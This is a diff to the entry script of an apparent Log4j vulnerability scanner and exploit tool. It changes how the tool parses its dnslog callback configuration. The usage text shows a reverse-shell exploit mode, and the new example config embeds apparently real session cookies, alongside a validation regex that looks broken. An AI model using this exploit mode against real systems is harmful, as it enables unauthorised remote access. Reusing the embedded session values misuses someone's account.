@@ -43,6 +43,10 @@ Usage:
     python run.py -m exploit -e revershell -l 127.0.0.1:5555 -t http://target.domian -s header -d "Cookie: 123"
     python run.py -h
 
+File:
+    log, the folder to log the error message of running.
+    
+    
 mode:
     -m scan, --mode scan
     \tscan vulnerability with Log4j
@@ -60,9 +64,9 @@ if __name__ == '__main__':
         dns_config_err = "Can not load the dnslog config.\n" \
                          "Need to complete the dnslog.conf first.\n" \
                          "Example:\n" \
-                         "dnslog_url: http://dnslog.cn\n" \
-                         "dnslog_api: /api/getDnsData\n" \
-                         "dnslog_token: admin@admin"
+                         "dnslog_domain: testets.dnslog.cn\n" \
+                         "dnslog_api: http://dnslog.cn/getrecords.php?t=0.35608420067494695\n" \
+                         r'dnslog_header: {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36", "Cookie":"UM_distinctid=17e0051c7c3998-03953057dbe9d3-4303066-1fa400-17e0051c7c4b9c; CNZZDATA1278305074=310594447-1640682781-%7C1640907769; PHPSESSID=825va24bjbvhvklmfk0p2sk575"}'
         dns_config = open("dnslog.conf", "r").read()
         if "dnslog_url: \ndnslog_api:\ndnslog_token:" == dns_config:
             raise Exception(dns_config_err)
@@ -70,18 +74,18 @@ if __name__ == '__main__':
         else:
             dns_config = dns_config.replace(" ", "").split('\n')
             for config in dns_config:
-                if "dnslog_url" in config:
-                    if len(config.split(':')) < 3:
+                if "dnslog_domain" in config:
+                    if re.findall("^.^\w^\d", config.split(':')[-1]):
                         raise Exception(dns_config_err)
-                    Log4j.dnslog_url = config.split(':')[-2] + config.split(':')[-1]
+                    Log4j.dnslog_domain = config.split(':')[-1]
                 elif "dnslog_api" in config:
                     if len(config.split(':')) < 2 or len(config.split(':')) < 3:
                         raise Exception(dns_config_err)
-                    Log4j.dnslog_api = config.split(':')[-1]
-                elif "dnslog_token" in config:
-                    if len(config.split(':')) < 2 or len(config.split(':')) < 3:
-                        raise Exception(dns_config_err)
-                    Log4j.dnslog_token = config.split(':')[-1]
+                    Log4j.dnslog_api = config.split(':')[-2] + ":" + config.split(':')[-1]
+                elif "dnslog_header" in config:
+                    if len(config.split(':')) < 2:
+                        Log4j.dnslog_token = ""
+                    Log4j.dnslog_token = config.replace("dnslog_header:","")
         if len(sys.argv[1]) == 1:
             raise Exception("No options")
         print(str(sys.argv))
